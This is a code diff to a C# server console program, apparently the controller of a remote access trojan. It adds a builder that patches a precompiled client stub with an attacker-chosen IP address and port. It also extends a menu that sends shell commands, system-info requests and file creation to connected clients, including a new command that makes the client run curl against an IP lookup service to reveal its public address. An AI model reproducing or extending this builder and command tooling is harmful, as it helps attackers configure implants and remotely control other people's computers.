@@ -4,6 +4,9 @@ using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
+using dnlib.DotNet;
+using dnlib.DotNet.Writer;
+using dnlib.DotNet.Emit;
 
 namespace ServerApp
 {
@@ -58,9 +61,69 @@ namespace ServerApp
                             else
                                 Console.WriteLine("No client selected. Use arrow keys to select a client.");
                             break;
+                        case ConsoleKey.B:
+                            DisplayBuildMenu();
+                            break;
                     }
                 }
             }
+        }
+        static void DisplayBuildMenu()
+        {
+            Console.Clear();
+            Console.WriteLine("Welcome to the Builder!");
+            Console.Write("Please enter the IP Address: ");
+            string ipAddress = Console.ReadLine();
+
+            Console.Write("Please enter the Port: ");
+            if (!int.TryParse(Console.ReadLine(), out int port))
+            {
+                Console.WriteLine("Invalid port. Exiting...");
+                return;
+            }
+
+            ModifyStub("Stub.exe", ipAddress, port, "ModifiedStub.exe");
+            Console.WriteLine("Stub has been successfully modified.");
+        }
+
+        static void ModifyStub(string inputPath, string newIP, int newPort, string outputPath)
+        {
+            ModuleDefMD module = ModuleDefMD.Load(inputPath);
+
+            // Locate the specific type with the serverAddress and serverPort fields
+            TypeDef programType = module.Find("ClientApp.Program", true);
+            if (programType == null)
+            {
+                Console.WriteLine("ClientApp.Program type not found.");
+                return;
+            }
+
+            // Modify the static constructor or the initializer method
+            foreach (var method in programType.Methods)
+            {
+                if (method.IsStaticConstructor || method.IsConstructor)
+                {
+                    for (int i = 0; i < method.Body.Instructions.Count; i++)
+                    {
+                        // Modify the IP address
+                        if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr &&
+                            method.Body.Instructions[i].Operand.ToString() == "%ADDRESS%") // Check for the original IP address
+                        {
+                            method.Body.Instructions[i].Operand = newIP;
+                        }
+                        // Modify the port
+                        else if (method.Body.Instructions[i].OpCode == OpCodes.Ldc_I4 &&
+                                 (int)method.Body.Instructions[i].Operand == 02220) // Check for the original port
+                        {
+                            method.Body.Instructions[i].Operand = newPort;
+                        }
+                    }
+                }
+            }
+
+            // Save the modified assembly
+            module.Write(outputPath);
+            Console.WriteLine("Client modified and saved to " + outputPath);
         }
 
         static void DisplayCommandMenu()
@@ -73,7 +136,8 @@ namespace ServerApp
                 Console.WriteLine("2: Get System Info");
                 Console.WriteLine("3: Custom Shell Command");
                 Console.WriteLine("4: Create File");
-                Console.WriteLine("5: Exit Command Menu");
+                Console.WriteLine("5: Show IP");
+                Console.WriteLine("6: Exit Command Menu");
                 Console.WriteLine("Enter the number of the command to execute or exit:");
 
                 string choice = Console.ReadLine();
@@ -99,13 +163,17 @@ namespace ServerApp
                         SendCommandToClient(clients[currentClientIndex], command);
                         break;
                     case "5":
-                        return;  // Exit the command menu
+                        command = "shell curl api.ipify.org";
+                        SendCommandToClient(clients[currentClientIndex], command);
+                        break;
+                    case "6":
+                        return;// Exit the command menu
                     default:
                         Console.WriteLine("Invalid command selection. Please try again.");
                         continue;
                 }
 
-                Console.WriteLine("Press 'T' to return to the command menu or any other key to continue...");
+                Console.WriteLine("Press Enter to return to the command menu or any other key to continue...");
                 if (Console.ReadKey(true).Key != ConsoleKey.Enter)
                     break;
             }
@@ -152,7 +220,7 @@ namespace ServerApp
                     {
                         SendCommandToClient(clientInfo, "pong");
                     }
-                    else
+                    else if (message != "ping")
                     {
                         Console.WriteLine($"Received from {clientInfo.Id} ({clientInfo.IpAddress}): {message}");
                     }
@@ -177,11 +245,14 @@ namespace ServerApp
             try
             {
                 client.Stream.Write(buffer, 0, buffer.Length);
-                Console.WriteLine($"Command sent to {client.Id} ({client.IpAddress}): {command}");
+                if (command != "pong")
+                {
+                    Console.WriteLine($"Command sent to {client.Id} ({client.IpAddress}): {command}");
+                }
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Failed to send command to {client.Id} ({client.IpAddress}): {ex.Message}");
+                Console.WriteLine($"Failed to send command ({command}) to {client.Id} ({client.IpAddress}): {ex.Message}");
             }
         }
     }
